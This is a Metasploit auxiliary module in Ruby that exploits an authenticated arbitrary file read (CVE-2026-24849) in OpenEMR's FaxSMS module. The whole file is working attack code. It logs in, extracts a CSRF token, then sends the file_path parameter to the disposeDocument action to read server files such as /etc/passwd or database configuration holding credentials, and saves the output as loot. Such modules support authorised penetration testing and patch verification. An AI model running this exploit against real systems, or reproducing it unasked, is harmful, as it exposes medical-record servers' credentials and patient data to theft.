class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OpenEMR prior to 7.0.4 Authenticated Arbitrary File Read',
        'Description' => %q{
          Exploits an authenticated arbitrary file read vulnerability in OpenEMR
          prior to version 7.0.4 (CVE-2026-24849). The FaxSMS module's EtherFaxActions
          disposeDocument action passes the file_path parameter directly to
          file_get_contents() without sanitisation, allowing any authenticated user
          to read arbitrary server-side files such as /etc/passwd or database
          configuration files containing credentials.
        },
        'Author' => [
          'doany1',
          'AMENDER'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-24849'],
          ['EDB', '52610']
        ],
        'DisclosureDate' => 'Jan 15, 2026',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to OpenEMR', '/']),
        OptString.new('USERNAME', [true, 'OpenEMR username', 'admin']),
        OptString.new('PASSWORD', [true, 'OpenEMR password', '']),
        OptString.new('SITE', [true, 'OpenEMR site name', 'default']),
        OptString.new('TARGETFILE', [true, 'The file to read from the server', '/etc/passwd'])
      ]
    )
  end

  def run
    print_status("Authenticating to OpenEMR as '#{datastore['USERNAME']}'...")

    cookie = do_login
    unless cookie
      print_error('Authentication failed')
      return
    end

    print_good('Authentication successful')

    print_status("Attempting to read #{datastore['TARGETFILE']}...")

    content = read_file(cookie, datastore['TARGETFILE'])

    if content.nil?
      print_error("Failed to read #{datastore['TARGETFILE']}")
      return
    end

    print_good('File content:')
    print_line(content)

    store_loot(
      'openemr.file',
      'text/plain',
      rhost,
      content,
      datastore['TARGETFILE'],
      'OpenEMR Arbitrary File Read'
    )
  end

  def do_login
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'interface', 'login', 'login.php'),
      'vars_get' => {
        'site' => datastore['SITE']
      }
    )

    unless res
      print_error('Connection failed during login page request')
      return nil
    end

    csrf_token = nil
    if res.body =~ /csrf_token_form.*?value=["']([^"']+)["']/i
      csrf_token = ::Regexp.last_match(1)
    end

    session_cookie = res.get_cookies

    post_data = {
      'new_login_session_management' => '1',
      'authProvider' => 'Default',
      'authUser' => datastore['USERNAME'],
      'clearPass' => datastore['PASSWORD'],
      'languageChoice' => '1'
    }
    post_data['csrf_token_form'] = csrf_token if csrf_token

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'interface', 'main', 'main_screen.php'),
      'vars_get' => {
        'auth' => 'login',
        'site' => datastore['SITE']
      },
      'vars_post' => post_data,
      'cookie' => session_cookie
    )

    unless res
      print_error('Connection failed during authentication')
      return nil
    end

    res.get_cookies
  end

  def read_file(cookie, file_path)
    faxsms_uri = normalize_uri(
      target_uri.path,
      'interface', 'modules', 'custom_modules', 'oe-module-faxsms', 'index.php'
    )

    actions = ['disposeDocument', 'disposeDoc']

    actions.each do |action|
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => faxsms_uri,
        'vars_get' => {
          'site' => datastore['SITE'],
          'type' => 'fax',
          'serviceType' => 'etherfax',
          '_ACTION_COMMAND' => action,
          'file_path' => file_path,
          'action' => 'download'
        },
        'cookie' => cookie
      )

      unless res
        print_error('Connection failed during file read')
        return nil
      end

      body = res.body.to_s

      if body.include?('login_screen.php?error=1')
        print_error('Session rejected - authentication may have failed')
        return nil
      end

      if body.include?('Problem with download')
        print_error("File not found or not readable: #{file_path}")
        return nil
      end

      next if body.downcase.include?('service is not found')
      next if body.downcase.include?('install or turn service')
      next if body.strip.empty?

      return body
    end

    nil
  end
end